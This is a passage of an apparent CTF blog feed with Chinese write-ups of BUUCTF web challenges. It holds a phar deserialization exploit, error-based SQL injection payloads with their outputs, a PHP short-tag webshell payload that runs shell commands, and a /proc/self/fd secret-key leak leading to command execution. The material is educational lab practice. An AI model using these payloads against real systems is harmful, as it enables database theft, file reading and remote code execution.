<span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;van.phar&quot;</span>);<span class="comment">#删除phar.phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;van.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">#提高性能，好像不必要</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">https://www.jianshu.com/p/5b91e0b7f3ac</a></p><p><a href="https://blog.csdn.net/weixin_45642610/article/details/118559247">https://blog.csdn.net/weixin_45642610/article/details/118559247</a></p><p><a href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">https://blog.csdn.net/weixin_44077544/article/details/102844554</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;做题&lt;/p&gt;
&lt;p&gt;登录页面，尝试注册，然后登录，发现可以上传文件，先上传正常的，发现可以下载和删除，&lt;/p&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="phar" scheme="http://van0308.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>[RCTF2015]EasySQL</title>
    <link href="http://van0308.github.io/2023/02/11/RCTF2015-EasySQL/"/>
    <id>http://van0308.github.io/2023/02/11/RCTF2015-EasySQL/</id>
    <published>2023-02-11T07:58:38.000Z</published>
    <updated>2023-02-11T08:56:12.962Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">用户名 <span class="number">1</span><span class="string">&#x27; &quot; 报错</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near &#x27;</span>&quot;1&#x27;&quot;&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1</span><br><span class="line">猜测</span><br><span class="line">XPATH syntax error: &#x27;~web_sqli&#x27;</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()))),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~article,flag,users&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;~flag&#x27;</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag))),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~RCTF&#123;Good job! But flag not her&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;,pwd,email,real_flag_1s_here&#x27;</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,(<span class="keyword">select</span>(real_flag_1s_here)<span class="keyword">from</span>(users)),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;&#123;b89b2233-e011-429a-902c-08568c7&#x27;</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,reverse((<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>)))),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~&#125;c3f6f7c86580-c209-a924-110e-33&#x27;</span></span><br><span class="line"></span><br><span class="line">python</span><br><span class="line"><span class="operator">&gt;&gt;</span><span class="operator">&gt;</span> s<span class="operator">=</span>&quot;&#125;c3f6f7c86580-c209-a924-110e-33&quot;</span><br><span class="line"><span class="operator">&gt;&gt;</span><span class="operator">&gt;</span> s<span class="operator">=</span>s[::<span class="number">-1</span>]</span><br><span class="line"><span class="operator">&gt;&gt;</span><span class="operator">&gt;</span> print(s)</span><br><span class="line"><span class="number">33</span><span class="operator">-</span>e011<span class="number">-429</span>a<span class="number">-902</span>c<span class="number">-08568</span>c7f6f3c&#125;</span><br><span class="line">flag&#123;b89b2233<span class="operator">-</span>e011<span class="number">-429</span>a<span class="number">-902</span>c<span class="number">-08568</span>c7f6f3c&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/RABCDXB/article/details/122491459">https://blog.csdn.net/RABCDXB/article/details/122491459</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105179021">https://blog.csdn.net/mochu7777777/article/details/105179021</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
    <category term="sql" scheme="http://van0308.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>[红明谷CTF 2021]write_shell</title>
    <link href="http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/"/>
    <id>http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/</id>
    <published>2023-02-10T13:20:20.000Z</published>
    <updated>2023-02-10T14:38:29.723Z</updated>
    
    <content type="html"><![CDATA[<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>关键是利用file_put_contents查看输出结果，通过$dir得出路径</p><p>?action&#x3D;pwd  –&gt;  sandbox&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;</p><p>接下来写命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;script&gt;alert(&quot;whoami&quot;)&lt;/script&gt;</span><br><span class="line">访问http://0bdbbb92-4d08-46b8-a2ff-c089a0bc56ff.node4.buuoj.cn:81/sandbox/c47b21fcf8f0bc8b3920541abd8024fd/ 成功弹窗</span><br><span class="line"></span><br><span class="line">由于写入的文件是后缀名为php的，所以要能够执行语句，语法就得满足php。过滤了PHP，可以使用php的短标签。</span><br><span class="line"></span><br><span class="line">尝试了一下&lt;?= ?&gt;可以成功写入，这个&lt;?= ?&gt;相当于&lt;?echo ?&gt;,空格杯过滤了用%09代替,或者\t</span><br><span class="line"></span><br><span class="line">执行命令：PHP执行运算符：反引号（``）。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符&quot;`&quot;的效果与函数shell_exec() 相同。</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">关闭了 shell_exec() 时反引号运算符是无效的。</span><br><span class="line">与其它某些语言不同，反引号不能在双引号字符串中使用。</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">?action=upload&amp;data=&lt;?=`ls%09/`?&gt;</span><br><span class="line">?action=upload&amp;data=&lt;?=`cat%09/f*`?&gt;</span><br><span class="line"></span><br><span class="line">a?b:c 三目运算符</span><br><span class="line">a?:b a为真返回 否则返回b</span><br><span class="line">a??b a存在(不为null)返回a，否则返回b</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/cjdgg/article/details/118216890">https://blog.csdn.net/cjdgg/article/details/118216890</a></p><p><a href="https://www.cnblogs.com/aninock/p/15221334.html">https://www.cnblogs.com/aninock/p/15221334.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;代码审计&quot;&gt;&lt;a href=&quot;#代码审计&quot; class=&quot;headerlink&quot; title=&quot;代码审计&quot;&gt;&lt;/a&gt;代码审计&lt;/h3&gt;&lt;h4 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h</summary>
      
    
    
    
    
    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 白虎组]PicDown</title>
    <link href="http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
    <id>http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</id>
    <published>2023-02-10T12:57:59.000Z</published>
    <updated>2023-02-11T07:39:03.397Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&#x3D;</p><p>一般这种就是路径遍历，ssrf，或者文件包含，PHP伪协议php:&#x2F;&#x2F;filter,file:&#x2F;&#x2F;,或者?file&#x3D;<a href="http://127.0.0.1/admin.php%E7%AD%89%E7%AD%89">http://127.0.0.1/admin.php等等</a></p><p>试一下路径遍历，发现下载了几个文件，不过仔细看大小不同。用记事本打开，知道与自己的遍历的内容有关。题目可以直接..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag找到 据说是平台环境问题，正式比赛flag不在这里。</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230210210219477.png" alt="image-20230210210219477"></p><p>用抓包的话，不会下载文件，而是直接可以看出内容</p><h4 id="正规解法"><a href="#正规解法" class="headerlink" title="正规解法"></a>正规解法</h4><blockquote><p>我们都知道可以通过&#x2F;proc&#x2F;$pid&#x2F;来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的系统信息，而不用每次都获取pid</p></blockquote><p>即proc&#x2F;具体pid&#x2F;目录和proc&#x2F;self&#x2F;目录 基本等价</p><blockquote><p>fd是一个目录，里面包含着<strong>当前进程打开的每一个文件</strong>的描述符（file descriptor）差不多就是<strong>路径</strong>啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过<strong>fd</strong>目录的文件获取进程，从而打开每个文件的路径以及文件内容。</p><p>这个fd比较重要，因为在Linux系统中，如果一个程序用 open() 打开了一个文件，但是最终没有关闭它，即使从外部（如：os.remove(SECRET_FILE))删除这个文件之后，在&#x2F;proc这个进程的 pid目录下的fd文件描述符 目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ   当前环境</span><br><span class="line">/proc/self/cmdline 启动当前进程的完整命令---发现有app.py</span><br><span class="line">/proc/self/fd/文件描述符   查看当前进程打开的文件内容   </span><br><span class="line"></span><br><span class="line">读取app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现了open一个secret.txt，但是没有关闭，而是用os.remove,那么我们就可以通过fd目录查看他的内容。page页即url查询的东西最终会写入beautiful.jpg以文件形式返回。/no_one_know_the_manager页则是有shell可以执行，只要key == SECRET_KEY，那么就可以执行，但是这里是没有回显的。随便传命令和key进去，发现没有print(SECRET_KEY)，而只有wrong key!,应该是被删除了。那我们前面有个secret.txt读一读</span><br></pre></td></tr></table></figure><p>&#x2F;page?url&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3      最后一位爆破出来发现是3</p><p>得到L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;  应该就是key</p><p>试一下&#x2F;no_one_know_the_manager?key&#x3D;L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;&amp;shell&#x3D;ls</p><p>回显OK则正确。（如果出错，那么url编码一下key)</p><p>接下来由于是无回显的，那么需要在服务器反弹shell</p><p>由于没有服务器，所以参考网上用buu靶机来做。结果发现buu的靶机也不行。先搁置着（坑）</p><p>不过可以选择dnslog外带数据</p><figure class="highlight plaintext"><table><tr><td 